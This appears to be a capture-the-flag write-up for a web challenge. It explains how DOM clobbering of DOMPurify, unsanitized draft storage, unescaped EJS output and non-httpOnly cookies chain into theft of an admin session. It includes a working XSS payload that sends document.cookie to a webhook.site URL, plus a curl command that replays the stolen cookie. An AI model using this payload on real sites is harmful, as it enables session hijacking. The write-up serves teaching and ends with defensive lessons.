# Personal Blog CTF - Exploit Documentation

## Challenge Information
- **Name**: Personal Blog (For your eyes only?)
- **URL**: http://34.26.148.28:5000/
- **Flag Format**: `ouftctf{...}`

## Vulnerability Analysis

### 1. DOM Clobbering in Editor
**Location**: `web/public/editor.js:31`
```javascript
const clean = window.DOMPurify.sanitize(editor.innerHTML);
```

The code references `window.DOMPurify.sanitize()` which can be overridden using DOM Clobbering.

### 2. Unsanitized Draft Storage
**Location**: `web/server.js:463-467`
```javascript
app.post('/api/autosave', requireLogin, (req, res) => {
  const rawContent = String(req.body.content || '');
  post.draftContent = rawContent;  // ← Stores RAW unsanitized HTML!
  saveDb(db);
});
```

The `/api/autosave` endpoint stores raw HTML without sanitization.

### 3. Unescaped Output in Template
**Location**: `web/views/editor.ejs:13`
```html
<div id="editor" contenteditable="true"><%- draftContent %></div>
```

The `<%- %>` tag renders unescaped HTML, so our payload executes!

### 4. Session Cookie Management
**Location**: `web/server.js:493-502`
```javascript
app.get('/magic/:token', (req, res) => {
  const existingSid = req.cookies.sid;
  if (existingSid) {
    res.cookie('sid_prev', existingSid, cookieOptions());  // ← Stores old session
  }
  const sid = createSession(db, record.userId);
  res.cookie('sid', sid, cookieOptions());
  const target = safeRedirect(req.query.redirect);
  return res.redirect(target);
});
```

Magic links store the previous session in `sid_prev` cookie with `httpOnly: false`.

### 5. Cookie Options
**Location**: `web/server.js:95-100`
```javascript
function cookieOptions() {
  return {
    httpOnly: false,  // ← JavaScript can read cookies!
    sameSite: 'Lax',
    path: '/'
  };
}
```

## Attack Vector

### Exploitation Chain:

1. **Register and Login** as a regular user
2. **Create a new post** to get a post ID
3. **Generate a magic link** to create a session transition point
4. **Upload malicious payload** via `/api/autosave`:
   ```html
   <form id="DOMPurify">
   <img name="sanitize" src=x onerror="
     fetch('https://webhook.site/YOUR-ID?c='+document.cookie)
   ">
   </form>
   ```
5. **Report magic link** to admin bot: `/magic/{token}?redirect=/edit/{postId}`
6. **Admin visits** and triggers the exploit:
   - Magic link stores admin's session in `sid_prev` cookie
   - Admin gets redirected to `/edit/{postId}`
   - Editor loads with our unsanitized payload
   - `window.DOMPurify` is clobbered to our form element
   - `window.DOMPurify.sanitize` becomes the `<img>` element
   - XSS executes and steals `sid_prev` cookie
7. **Use stolen cookie** to access `/flag` endpoint

## DOM Clobbering Explanation

When HTML like this is rendered:
```html
<form id="DOMPurify">
  <img name="sanitize" src=x onerror="...">
</form>
```

The browser automatically creates:
- `window.DOMPurify` = reference to the `<form>` element
- `window.DOMPurify.sanitize` = reference to the `<img>` element (via name attribute)

So when `editor.js` calls:
```javascript
window.DOMPurify.sanitize(editor.innerHTML)
```

It's actually trying to call an `<img>` element as a function, which:
1. Causes an error/undefined behavior
2. But the `onerror` handler has already fired when the img src failed
3. Our XSS payload executes and steals cookies

## Exploitation Scripts

### Quick Bash Script
```bash
./exploit.sh
```

### Python Script (with listener)
```bash
python3 exploit.py
```

### Manual Steps
1. Go to https://webhook.site/ and get a webhook URL
2. Edit exploit.sh and set WEBHOOK_URL
3. Run: `./exploit.sh`
4. Copy the magic URL output
5. Go to http://34.26.148.28:5000/report
6. Paste the magic URL and submit
7. Check webhook.site for the stolen cookie
8. Use cookie to get flag:
   ```bash
   curl -b "sid=STOLEN_COOKIE" http://34.26.148.28:5000/flag
   ```

## Key Takeaways

1. **Never trust client-side sanitization** - DOMPurify on client can be bypassed
2. **Always sanitize on server** - The `/api/autosave` should sanitize before storing
3. **Use <%=` not `<%-`** - EJS should escape HTML by default
4. **httpOnly cookies** - Sensitive cookies should use `httpOnly: true`
5. **DOM Clobbering** - Be careful with `window.*` references in JavaScript

## Flag
After exploitation, the flag will be available at:
```
http://34.26.148.28:5000/flag
```

With the admin's session cookie (stolen via sid_prev).
